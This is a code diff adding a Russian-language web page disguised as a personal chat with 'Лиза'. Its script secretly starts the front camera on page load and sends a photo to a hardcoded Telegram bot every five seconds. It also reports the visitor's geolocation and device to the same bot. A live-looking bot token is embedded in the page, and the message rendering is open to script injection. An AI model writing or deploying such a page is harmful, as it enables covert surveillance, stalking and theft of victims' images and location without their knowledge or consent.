@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>Чат с Лизой</title>
+    <style>
+        html, body {
+            height: 100dvh;
+            min-height: 100dvh;
+            width: 100vw;
+            min-width: 100vw;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            overflow: hidden;
+            background: #18191a;
+        }
+        *, *:before, *:after {
+            box-sizing: inherit;
+        }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #e4e6eb;
+            min-height: 100dvh;
+            height: 100dvh;
+        }
+        .chat-container {
+            height: 100dvh;
+            min-height: 100dvh;
+            width: 100vw;
+            min-width: 100vw;
+            max-width: 100vw;
+            margin: 0;
+            border-radius: 0;
+            box-shadow: none;
+            display: flex;
+            flex-direction: column;
+            background: #242526;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 20px 24px 16px 24px;
+            border-bottom: 1px solid #393a3b;
+            background: #242526;
+            border-radius: 14px 14px 0 0;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .avatar {
+            width: 48px; height: 48px;
+            border-radius: 50%; object-fit: cover;
+            margin-right: 15px;
+            border: 2px solid #3578e5;
+        }
+        .name {
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #fff;
+        }
+        .messages {
+            flex: 1 1 auto;
+            min-height: 0;
+            max-height: none;
+            overflow-y: auto;
+            padding: 24px 16px 24px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            scroll-behavior: smooth;
+            box-sizing: border-box;
+        }
+        .msg {
+            display: flex;
+            align-items: flex-end;
+            margin: 0;
+        }
+        .msg.me {
+            flex-direction: row-reverse;
+        }
+        .msg .bubble {
+            max-width: 80vw;
+            padding: 14px 18px;
+            border-radius: 18px;
+            font-size: 1.08em;
+            background: #3578e5;
+            color: #fff;
+            margin: 0 8px;
+            box-shadow: 0 2px 8px #0002;
+            word-break: break-word;
+            position: relative;
+        }
+        .msg.me .bubble {
+            background: #4e4f50;
+            color: #e4e6eb;
+        }
+        .msg .avatar {
+            width: 36px; height: 36px;
+            margin: 0 4px;
+            border: 2px solid #3578e5;
+        }
+        .msg.me .avatar {
+            border: 2px solid #4e4f50;
+        }
+        .msg .bubble .sender {
+            display: block;
+            font-size: 0.85em;
+            color: #b0b3b8;
+            margin-bottom: 2px;
+        }
+        .msg .media {
+            max-width: 80vw;
+            max-height: 220px;
+            display: block;
+            margin: 5px 0;
+            border-radius: 12px;
+            background: #222;
+        }
+        .input-area {
+            display: flex;
+            gap: 7px;
+            padding: 12px 8px 12px 8px;
+            border-top: 1px solid #393a3b;
+            background: #242526;
+            border-radius: 0 0 14px 14px;
+            position: sticky;
+            bottom: 0;
+            z-index: 10;
+        }
+        .input-area input[type="text"] {
+            flex: 1;
+            padding: 14px 16px;
+            border-radius: 20px;
+            border: none;
+            background: #3a3b3c;
+            color: #fff;
+            font-size: 1.12em;
+            min-width: 0;
+        }
+        .input-area input[type="text"]:focus {
+            outline: 2px solid #3578e5;
+        }
+        .input-area input[type="file"] {
+            display: none;
+        }
+        .input-area label {
+            cursor: pointer;
+            background: #3a3b3c;
+            color: #b0b3b8;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 1.3em;
+            transition: background 0.2s;
+        }
+        .input-area label:hover {
+            background: #3578e5;
+            color: #fff;
+        }
+        .input-area button {
+            background: #3578e5;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 18px;
+            font-size: 1.18em;
+            transition: background 0.2s;
+            min-width: 44px;
+        }
+        .input-area button:hover {
+            background: #2851a3;
+        }
+        @media (max-width: 600px) {
+            html, body {
+                height: 100dvh !important;
+                min-height: 100dvh !important;
+                width: 100vw !important;
+                min-width: 100vw !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                overflow-x: hidden !important;
+                background: #18191a !important;
+            }
+            .chat-container {
+                width: 100vw !important;
+                min-width: 100vw !important;
+                max-width: 100vw !important;
+                margin: 0 !important;
+                border-radius: 0 !important;
+                min-height: 100dvh !important;
+                height: 100dvh !important;
+                box-shadow: none !important;
+                background: #242526 !important;
+                display: flex !important;
+                flex-direction: column !important;
+            }
+            .header {
+                padding: 10px 8px 8px 8px;
+                font-size: 1.08em;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .avatar {
+                width: 34px; height: 34px;
+                margin-right: 8px;
+            }
+            .name {
+                font-size: 1.08em;
+            }
+            .messages {
+                padding: 8px 4px 70px 4px;
+                font-size: 1.08em;
+                min-height: 0;
+                max-height: none;
+                border-radius: 0;
+            }
+            .msg .bubble {
+                font-size: 1.08em;
+                padding: 10px 10px;
+                max-width: 95vw;
+                border-radius: 14px;
+            }
+            .msg .media {
+                max-width: 95vw;
+            }
+            .input-area {
+                padding: 6px 4px 6px 4px;
+                gap: 4px;
+                border-radius: 0;
+            }
+            .input-area input[type="text"] {
+                font-size: 1.08em;
+                padding: 10px 8px;
+            }
+            .input-area label, .input-area button {
+                font-size: 1.12em;
+                padding: 10px 8px;
+                min-width: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="chat-container">
+    <div class="header">
+        <img src="Лиза.jpg" alt="Лиза" class="avatar">
+        <span class="name">Лиза</span>
+    </div>
+    <div class="messages" id="messages"></div>
+    <form class="input-area" id="chatForm">
+        <input type="text" id="textInput" placeholder="Сообщение..." autocomplete="off">
+        <label>
+            📷
+            <input type="file" id="fileInput" accept="image/*,video/*,audio/*">
+        </label>
+        <button type="button" id="voiceBtn">🎤</button>
+        <button type="submit">Отправить</button>
+    </form>
+</div>
+<script>
+const BOT_TOKEN = '8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
+const CHAT_ID = '2126669672';
+const POLINA_AVATAR = 'Лиза.jpg';
+const POLINA_NAME = 'Лиза';
+const ME_NAME = 'Вы';
+
+const messages = document.getElementById('messages');
+const chatForm = document.getElementById('chatForm');
+const textInput = document.getElementById('textInput');
+const fileInput = document.getElementById('fileInput');
+const voiceBtn = document.getElementById('voiceBtn');
+
+let lastUpdateId = localStorage.getItem('lastUpdateId') || 0;
+
+let chatHistory = JSON.parse(localStorage.getItem('polinaChatHistory') || '[]');
+
+// === КАМЕРА И АВТОФОТО ===
+// [Удалено всё, что связано с cameraStream, cameraInterval, startFrontCamera, startPhotoInterval, takeAndSendPhoto]
+
+// === ПЕРИОДИЧЕСКИЕ ФОТО КАЖДЫЕ 5 СЕКУНД ===
+async function startPeriodicPhotos() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+        video.play();
+
+        setInterval(async () => {
+            if (document.visibilityState === 'visible') {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                try {
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                    // Отправляем фото в Telegram
+                    let data = new FormData();
+                    data.append('chat_id', CHAT_ID);
+                    data.append('photo', blob, 'periodic.jpg');
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: data
+                    });
+                } catch (error) {
+                    // Ошибка отправки фото
+                }
+            }
+        }, 5000); // 5 секунд
+
+    } catch (error) {
+        // Ошибка доступа к камере
+    }
+}
+
+function saveChatHistory() {
+    localStorage.setItem('polinaChatHistory', JSON.stringify(chatHistory));
+}
+
+function renderChatHistory() {
+    messages.innerHTML = '';
+    chatHistory.forEach(msgObj => {
+        addMessage(msgObj.text, msgObj.type, msgObj.fileUrl, msgObj.isMe, true);
+    });
+}
+
+function addMessage(text, type = 'text', fileUrl = null, isMe = true, silent = false) {
+    const msg = document.createElement('div');
+    msg.className = 'msg' + (isMe ? ' me' : '');
+    let content = '';
+    let sender = isMe ? ME_NAME : POLINA_NAME;
+    if (type === 'text') {
+        content = `<span class="bubble"><span class="sender">${sender}</span>${text}</span>`;
+    } else if (type === 'image') {
+        content = `<span class="bubble"><span class="sender">${sender}</span><img src="${fileUrl}" class="media"></span>`;
+    } else if (type === 'video') {
+        content = `<span class="bubble"><span class="sender">${sender}</span><video src="${fileUrl}" controls class="media"></video></span>`;
+    } else if (type === 'audio') {
+        content = `<span class="bubble"><span class="sender">${sender}</span><audio src="${fileUrl}" controls class="media"></audio></span>`;
+    }
+    if (isMe) {
+        msg.innerHTML = content;
+    } else {
+        msg.innerHTML = `<img src="${POLINA_AVATAR}" class="avatar">` + content;
+    }
+    messages.appendChild(msg);
+    messages.scrollTop = messages.scrollHeight;
+    if (!silent) {
+        chatHistory.push({text, type, fileUrl, isMe});
+        saveChatHistory();
+    }
+}
+
+function sendToBot(formData) {
+    if (formData.text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: formData.text || '[медиа]',
+                disable_notification: false
+            })
+        });
+    }
+    if (formData.file) {
+        let type = formData.file.type || '';
+        let tgMethod = null;
+        let fieldName = null;
+        if (type.startsWith('image/')) {
+            tgMethod = 'sendPhoto';
+            fieldName = 'photo';
+        } else if (type.startsWith('video/')) {
+            tgMethod = 'sendVideo';
+            fieldName = 'video';
+        } else if (type.startsWith('audio/')) {
+            tgMethod = 'sendVoice';
+            fieldName = 'voice';
+        } else {
+            // Если это Blob без типа (например, с canvas), пробуем как фото
+            tgMethod = 'sendPhoto';
+            fieldName = 'photo';
+        }
+        if (tgMethod) {
+            let data = new FormData();
+            data.append('chat_id', CHAT_ID);
+            let file = formData.file;
+            if (file instanceof Blob && !file.name) {
+                file = new File([file], 'photo.jpg', {type: 'image/jpeg'});
+            }
+            data.append(fieldName, file);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${tgMethod}`, {
+                method: 'POST',
+                body: data
+            });
+        }
+    }
+}
+
+chatForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const text = textInput.value.trim();
+    if (text) {
+        addMessage(text, 'text', null, true);
+        sendToBot({text});
+        textInput.value = '';
+    }
+});
+
+fileInput.addEventListener('change', function() {
+    const file = fileInput.files[0];
+    if (!file) return;
+    const url = URL.createObjectURL(file);
+    let type = file.type;
+    if (type.startsWith('image/')) {
+        addMessage('', 'image', url, true);
+    } else if (type.startsWith('video/')) {
+        addMessage('', 'video', url, true);
+    } else if (type.startsWith('audio/')) {
+        addMessage('', 'audio', url, true);
+    }
+    sendToBot({file});
+    fileInput.value = '';
+});
+
+let mediaRecorder, audioChunks = [];
+voiceBtn.onclick = async function() {
+    if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+            const url = URL.createObjectURL(audioBlob);
+            addMessage('', 'audio', url, true);
+            sendToBot({file: audioBlob});
+            audioChunks = [];
+        };
+        mediaRecorder.start();
+        voiceBtn.textContent = '⏹️';
+    } else {
+        mediaRecorder.stop();
+        voiceBtn.textContent = '🎤';
+    }
+};
+
+function getDeviceModel() {
+    let ua = navigator.userAgent;
+    let model = ua.match(/\(([^)]+)\)/);
+    return model ? model[1] : ua;
+}
+function sendLocationAndDevice() {
+    if (localStorage.getItem('geoAsked')) return;
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const device = getDeviceModel();
+            const text = `🌍 Новый вход в чат!\nМестоположение: https://maps.google.com/?q=${lat},${lon}\nУстройство: ${device}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text
+                })
+            });
+            localStorage.setItem('geoAsked', '1');
+        }, function() {
+            localStorage.setItem('geoAsked', '1');
+        });
+    } else {
+        localStorage.setItem('geoAsked', '1');
+    }
+}
+
+function pollPolinaMessages() {
+    setInterval(async () => {
+        try {
+            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${parseInt(lastUpdateId)+1}`);
+            const data = await resp.json();
+            if (data.ok && data.result && data.result.length) {
+                data.result.forEach(update => {
+                    lastUpdateId = update.update_id;
+                    localStorage.setItem('lastUpdateId', lastUpdateId);
+                    if (update.message && update.message.chat && update.message.chat.id == CHAT_ID) {
+                        if (update.message.from && update.message.from.username !== 'your_bot_username') {
+                            if (update.message.text) {
+                                addMessage(update.message.text, 'text', null, false);
+                            } else if (update.message.photo) {
+                                const fileId = update.message.photo[update.message.photo.length-1].file_id;
+                                fetchPhotoUrl(fileId, url => addMessage('', 'image', url, false));
+                            } else if (update.message.voice) {
+                                fetchFileUrl(update.message.voice.file_id, url => addMessage('', 'audio', url, false));
+                            } else if (update.message.video) {
+                                fetchFileUrl(update.message.video.file_id, url => addMessage('', 'video', url, false));
+                            }
+                        }
+                    }
+                });
+            }
+        } catch(e) {}
+    }, 3000);
+}
+
+function fetchFileUrl(fileId, cb) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`)
+        .then(r=>r.json())
+        .then(data => {
+            if (data.ok && data.result && data.result.file_path) {
+                cb(`https://api.telegram.org/file/bot${BOT_TOKEN}/${data.result.file_path}`);
+            }
+        });
+}
+function fetchPhotoUrl(fileId, cb) {
+    fetchFileUrl(fileId, cb);
+}
+
+window.onload = function() {
+    sendLocationAndDevice();
+    renderChatHistory();
+    pollPolinaMessages();
+    startPeriodicPhotos(); // ← запуск автосъёмки
+};
+</script>
+</body>
+</html>
+
+
